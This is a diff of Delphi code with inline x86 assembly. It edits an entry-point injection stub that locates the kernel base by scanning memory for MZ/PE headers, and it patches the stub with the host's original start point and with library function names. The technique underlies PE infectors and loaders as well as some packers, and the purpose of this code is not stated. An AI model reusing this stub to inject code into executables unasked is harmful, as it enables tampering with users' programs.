@@ -507,19 +507,19 @@ procedure InjectProc(); asm
 
 
          AND ESI, $FFFF0000
-@_L1:    CMP BYTE PTR [EBP + 5], $00
-         JZ @_FL
+@_L1:    //CMP BYTE PTR [EBP + 5], $00
+         //JZ @_FL
          CMP WORD PTR [ESI], "ZM"
          JZ @_CPE
 @_L2:    SUB ESI, $10000
-         DEC BYTE PTR [EBP + 5]
+         //DEC BYTE PTR [EBP + 5]
          JMP @_L1
 @_CPE:   MOV EDI, [ESI + $3C]
          ADD EDI, ESI
          CMP DWORD PTR [EDI], "EP"
          JZ @_GK
          JMP @_L2
-@_FL:    MOV ESI, $0BFF70000
+@_FL:    MOV ESI, $07C800000
 @_GK:    XCHG EAX, ESI
          // EAX = kernel base
          MOV EBX, EAX
@@ -698,14 +698,14 @@ const
   CI  : Array [0..14] of AnsiChar = 'CoreInitialize' + #0;
   FL  : Array [0..11] of AnsiChar = 'FreeLibrary' + #0;
 Begin
-  Size := $135;
+  Size := $12D;
   Result := GetMemory(Size);
   CopyMemory(Result, @InjectProc, Size);
-  PCardinal(Cardinal(Result) + $78)^ := RealStartPoint;
-  CopyMemory(Pointer(Cardinal(Result) + $101), @LLE[0], 15);
-  CopyMemory(Pointer(Cardinal(Result) + $110), @UOE[0], 10);
-  CopyMemory(Pointer(Cardinal(Result) + $11A), @CI[0], 15);
-  CopyMemory(Pointer(Cardinal(Result) + $129), @FL[0], 12);
+  PCardinal(Cardinal(Result) + $6F)^ := RealStartPoint;
+  CopyMemory(Pointer(Cardinal(Result) + $F8), @LLE[0], 15);
+  CopyMemory(Pointer(Cardinal(Result) + $F8 + 15), @UOE[0], 10);
+  CopyMemory(Pointer(Cardinal(Result) + $F8 + 25), @CI[0], 15);
+  CopyMemory(Pointer(Cardinal(Result) + $F8 + 40), @FL[0], 12);
 End;
 
 function Align(Value, Factor: Cardinal): Cardinal;
